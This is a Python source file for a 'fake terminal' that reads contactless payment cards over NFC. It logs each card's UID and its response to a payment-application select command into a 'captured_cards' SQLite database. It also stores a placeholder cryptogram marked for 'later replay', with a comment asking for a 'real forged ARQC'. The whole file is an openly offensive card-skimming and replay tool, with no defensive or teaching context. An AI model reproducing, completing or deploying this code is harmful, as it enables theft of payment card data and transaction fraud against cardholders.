import nfc
import sqlite3
import time

class FakeTerminal:
	def __init__(self, db_file="captured_cards.db", device="usb"):
		self.device = device
		self.db_file = db_file
		self._setup_database()

	def _setup_database(self):
		conn = sqlite3.connect(self.db_file)
		cursor = conn.cursor()
		cursor.execute("""
			CREATE TABLE IF NOT EXISTS captured_cards (
				id INTEGER PRIMARY KEY AUTOINCREMENT,
				timestamp TEXT,
				uid TEXT,
				arqc TEXT,
				apdu_request TEXT,
				apdu_response TEXT
			)
		""")
		conn.commit()
		conn.close()

	def start_sniffing(self):
		"""Begins capturing NFC transactions from cards"""
		print("Fake terminal is ready. Waiting for card taps...")
		with nfc.ContactlessFrontend(self.device) as clf:
			while True:
				clf.connect(rdwr={"on-connect": lambda tag: self._capture_card(tag)})

	def _capture_card(self, tag):
		"""Extracts APDU and ARQC data from the card"""
		uid = tag.identifier.hex()
		print(f"Captured Card UID: {uid}")

		# Extract AID and generate fake ARQC
		select_aid_apdu = bytes.fromhex("00A4040007A0000000031010")  # Example APDU for selecting an AID
		response = tag.exchange(select_aid_apdu)
		fake_arqc = self._generate_fake_arqc(response)

		# Store everything
		self._save_data(uid, select_aid_apdu.hex(), response.hex(), fake_arqc.hex())
		print(f"Captured & Stored: UID={uid}, ARQC={fake_arqc.hex()}")

	def _generate_fake_arqc(self, response):
		"""Generates a fake ARQC for later replay"""
		return bytes.fromhex("DEADBEEFCAFEBABE")  # Replace with real forged ARQC

	def _save_data(self, uid, apdu_request, apdu_response, arqc):
		conn = sqlite3.connect(self.db_file)
		cursor = conn.cursor()
		cursor.execute("""
			INSERT INTO captured_cards (timestamp, uid, apdu_request, apdu_response, arqc)
			VALUES (datetime('now'), ?, ?, ?, ?)
		""", (uid, apdu_request, apdu_response, arqc))
		conn.commit()
		conn.close()
